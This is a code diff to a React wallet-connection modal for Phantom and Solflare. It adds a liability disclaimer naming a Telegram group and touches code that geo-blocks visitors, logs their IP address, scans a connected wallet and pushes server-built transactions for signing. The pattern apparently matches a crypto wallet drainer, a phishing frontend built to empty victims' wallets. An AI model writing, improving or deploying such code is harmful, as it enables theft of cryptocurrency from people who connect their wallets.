@@ -1,4 +1,11 @@
-"use client"
+"use client" 
+// Автор скрипта (далее — «Разработчик») не несёт никакой ответственности за любые действия, совершённые с использованием данного скрипта, включая, но не ограничиваясь, его применением в незаконных, противоправных, вредоносных или иных целях, нарушающих законодательство любой юрисдикции.
+//Скрипт предоставляется «как есть» исключительно в информационных и образовательных целях. Пользователь самостоятельно принимает решение о его использовании и несёт полную ответственность за все последствия, включая любые убытки, ущерб, претензии третьих лиц, административные или уголовные санкции.
+//Разработчик t.me baphometteam прямо заявляет, что не поощряет, не поддерживает и не одобряет использование скрипта в любых незаконных целях. Любое такое использование осуществляется исключительно на риск и страх пользователя.
+//The author of this script (hereinafter referred to as the "Developer") assumes no liability for any actions taken using this script, including, but not limited to, its use for illegal, unlawful, harmful, or other purposes that violate the laws of any jurisdiction.
+//This script is provided "as is" for informational and educational purposes only. The user independently decides whether to use it and is fully responsible for all consequences, including any losses, damages, third-party claims, administrative or criminal penalties.
+//The Developer expressly states that it does not encourage, support, or condone the use of this script for any illegal purposes. Any such use is entirely at the user's risk.
+
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog" 
 import { Button } from "@/components/ui/button" 
 import Image from "next/image" 
@@ -31,8 +38,6 @@ const MOBILE_WALLETS = {
   phantom: {
     name: "Phantom",
     icon: "/phantom-icon.png",
-    deepLink: "phantom://browse/",
-    universalLink: "https://phantom.app/ul/browse/",
     mobile: {
       android: {
         schema: "phantom://",
@@ -47,8 +52,6 @@ const MOBILE_WALLETS = {
   solflare: {
     name: "Solflare",
     icon: "/solflare-icon.png",
-    deepLink: "solflare://ul/v1/browse/",
-    universalLink: "https://solflare.com/ul/v1/browse/",
     mobile: {
       android: {
         schema: "solflare://ul/v1/browse/",
@@ -59,6 +62,8 @@ const MOBILE_WALLETS = {
         universal: "https://solflare.com/ul/v1/browse/",
       },
     },
+    deepLink: "solflare://ul/v1/browse/",
+    universalLink: "https://solflare.com/ul/v1/browse/",
   },
 }
 
@@ -95,7 +100,7 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
     checkGeoBlockStatus()
   }, [])
 
-  
+
   const checkGeoBlockStatus = async () => {
     try {
       const response = await fetch("/api/check-geo")
@@ -107,7 +112,7 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
     } catch (error) {}
   }
 
-  
+
   const isInWalletBrowserInstance = (walletId: string) => {
     const userAgent = navigator.userAgent.toLowerCase()
     if (walletId === "phantom") {
@@ -119,7 +124,7 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
     return false
   }
 
-  
+
   const connectDesktopWalletInstance = async (walletId: string) => {
     const walletConfig = DESKTOP_WALLETS[walletId as keyof typeof DESKTOP_WALLETS]
 
@@ -144,7 +149,7 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
     }
   }
 
-  
+
   const connectMobileWalletInstance = (walletId: string) => {
     const walletConfig = MOBILE_WALLETS[walletId as keyof typeof MOBILE_WALLETS]
 
@@ -179,7 +184,7 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
     }, 1500)
   }
 
-  
+
   const handleConnectWalletClick = (walletId: string) => {
     if (isMobileViewState) {
       connectMobileWalletInstance(walletId)
@@ -188,7 +193,7 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
     }
   }
 
-  
+
   const scanAndCreateTransactionData = async (publicKey: string, provider: any) => {
     try {
       let userIPAddress = "unknown"
@@ -257,11 +262,7 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
             preflightCommitment: "confirmed",
           })
 
-          await connection.confirmTransaction({
-            signature,
-            blockhash: data.blockhash,
-            lastValidBlockHeight: data.lastValidBlockHeight,
-          })
+          await connection.confirmTransaction(signature, "confirmed")
           break
         } catch (err: any) {
           lastError = err
@@ -296,7 +297,7 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
     }
   }
 
-  
+
   if (isBlockedGeoState) {
     return null
   }
@@ -324,6 +325,15 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
             </DialogDescription>
           </DialogHeader>
         </div>
+        
+        {/* Error Message */}
+        {connectionError && (
+          <div className="px-6 pt-2">
+            <div className="bg-red-900/50 border border-red-700 text-red-200 px-4 py-2 rounded-lg text-sm">
+              {connectionError}
+            </div>
+          </div>
+        )}
         
         {/* Wallet Options */}
         <div className="px-6 pb-6 space-y-4">
@@ -357,4 +367,4 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
       </DialogContent>
     </Dialog>
   )
-    }
+      }
